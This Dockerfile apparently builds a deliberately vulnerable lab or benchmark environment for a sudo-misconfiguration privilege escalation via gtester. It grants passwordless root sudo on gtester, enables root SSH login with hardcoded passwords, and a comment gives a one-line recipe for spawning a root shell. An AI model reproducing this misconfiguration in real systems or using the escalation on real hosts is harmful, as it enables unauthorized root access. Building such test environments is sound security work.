FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_gtester
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/gtester as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and libglib2.0-dev-bin (provides gtester)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        libglib2.0-dev-bin \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify gtester is installed
RUN which gtester && ls -la /usr/bin/gtester

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# gtester runs test binaries. An attacker can craft a "test" that is actually
# a shell script: echo 'exec /bin/sh 0<&1' > /tmp/exploit && chmod +x /tmp/exploit
# Then: sudo gtester -q /tmp/exploit  -> root shell
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/gtester" > /etc/sudoers.d/gtester && \
    chmod 440 /etc/sudoers.d/gtester

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]